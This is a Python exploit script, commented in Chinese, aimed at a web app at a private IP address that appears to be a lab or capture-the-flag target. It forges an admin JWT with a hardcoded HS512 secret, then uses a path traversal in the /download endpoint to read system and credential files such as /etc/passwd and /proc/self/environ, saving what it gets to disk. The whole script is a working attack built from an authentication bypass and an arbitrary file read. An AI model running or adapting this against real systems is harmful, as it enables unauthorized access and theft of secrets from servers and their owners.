#!/usr/bin/env python3
"""
尝试读取Linux系统根目录文件
"""

import requests
import jwt
from datetime import datetime, timedelta, timezone

BASE_URL = "http://192.168.18.25:25004"
JWT_SECRET = "secret-secret-secret-secret-secret-secret-secret-secret-secret-secret-secret"

def create_admin_session():
    """创建admin session"""
    payload = {
        "sub": "admin",
        "exp": datetime.now(timezone.utc) + timedelta(minutes=30)
    }
    
    token = jwt.encode(payload, JWT_SECRET, algorithm="HS512")
    session = requests.Session()
    session.cookies.set("jwt", token)
    return session

def read_file(session, path):
    """读取文件"""
    # 使用路径遍历漏洞
    encoded_path = path.replace('/', '%2f')
    url = f"{BASE_URL}/download?path=uploads%2f..%2f{encoded_path}"
    
    print(f"[*] 尝试读取: {path}")
    
    r = session.get(url)
    if r.status_code == 200:
        print(f"[+] 成功! 大小: {len(r.content)} bytes")
        return r.text
    else:
        print(f"[!] 失败: {r.status_code}")
        return None

def main():
    session = create_admin_session()
    
    print("=" * 60)
    print("尝试读取Linux系统文件来探测目录结构")
    print("=" * 60)
    
    # 尝试读取常见的系统文件
    system_files = [
        "/etc/passwd",           # 用户列表
        "/etc/hosts",            # hosts文件
        "/etc/hostname",         # 主机名
        "/etc/os-release",       # 系统版本
        "/proc/self/environ",    # 环境变量
        "/proc/self/cmdline",    # 命令行参数
        "/proc/self/cwd",        # 当前工作目录（符号链接）
        "/proc/mounts",          # 挂载点
        "/../../../etc/passwd",  # 多层遍历
        "/../../../../../../../etc/passwd",  # 更多层
    ]
    
    results = {}
    
    for path in system_files:
        print(f"\n{'-'*60}")
        content = read_file(session, path)
        
        if content:
            results[path] = content
            print(f"\n内容预览:")
            lines = content.split('\n')[:10]
            for line in lines:
                print(f"  {line}")
            if len(content.split('\n')) > 10:
                print(f"  ... (共 {len(content.split('\n'))} 行)")
    
    # 保存结果
    if results:
        print(f"\n\n{'='*60}")
        print(f"成功读取 {len(results)} 个文件")
        print('='*60)
        
        for path, content in results.items():
            safe_name = path.replace('/', '_').replace('..', 'parent')
            filename = f"system{safe_name}.txt"
            with open(filename, 'w', encoding='utf-8', errors='ignore') as f:
                f.write(content)
            print(f"[+] 保存: {filename}")
    else:
        print("\n[!] 无法读取任何系统文件")
        print("[*] 可能的原因:")
        print("    1. 没有权限访问系统目录")
        print("    2. 路径遍历被限制在webapp目录内")
        print("    3. Tomcat运行在容器或chroot环境中")

if __name__ == "__main__":
    main()
